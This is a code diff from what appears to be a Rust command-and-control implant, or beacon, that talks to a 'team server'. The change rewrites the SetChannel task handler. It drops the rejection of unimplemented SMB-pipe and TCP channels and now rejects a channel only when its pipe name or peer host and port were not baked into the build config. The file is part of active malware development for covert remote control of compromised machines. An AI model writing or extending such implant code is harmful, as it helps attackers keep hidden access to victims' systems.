@@ -733,16 +733,35 @@ fn execute(
             // MED-NEW-I5 where _ => SmbPipe killed the beacon with a "success"
             // ack is fixed: from_u8's catch-all is Https, a safe no-op).
             let ch = crate::channels::Channel::from_u8(channel);
-            // SmbPipe/Tcp have NO parent-side implementation in this repo
-            // (implant-channels-2/3): a channel that can never transact must
-            // be REJECTED loudly, not silently accepted — the operator gets a
-            // clear error instead of a beacon that spins on a dead pipe/socket.
-            if !ch.is_implemented() {
-                crate::entry::diag_mark(b"ERR_CH_NOT_IMPL");
+            // All eight channels are implemented end-to-end now (the parent
+            // listeners live in the team server), but a channel whose endpoint
+            // isn't configured must still be REJECTED loudly — a beacon on an
+            // unconfigured pipe/socket would spin on a dead endpoint. The
+            // channel modules ALSO fail fast at transaction time with a diag
+            // mark (ERR_CH_SMB_NOCONF / ERR_CH_TCP_NOPEER); this check makes
+            // the misconfiguration visible at task time instead.
+            let config_gate: bool = match ch {
+                crate::channels::Channel::SmbPipe => !_cfg.smb_pipe_name.is_empty(),
+                crate::channels::Channel::Tcp => {
+                    !_cfg.tcp_peer_host.is_empty() && _cfg.tcp_peer_port != 0
+                }
+                _ => true,
+            };
+            if !config_gate {
+                crate::entry::diag_mark(b"ERR_CH_NOTCONF");
                 let mut e: crate::heap::String =
                     crate::heap::String::from("SetChannel rejected: ");
                 e.push_str(ch.name());
-                e.push_str(" has no parent-side implementation in this build");
+                e.push_str(" is not configured in this implant (bake ");
+                match ch {
+                    crate::channels::Channel::SmbPipe => {
+                        e.push_str("smb_pipe_name");
+                    }
+                    _ => {
+                        e.push_str("tcp_peer_host/tcp_peer_port");
+                    }
+                }
+                e.push_str(" into the build config)");
                 return vec![Response::Err(e)];
             }
             crate::channels::set_active(ch);
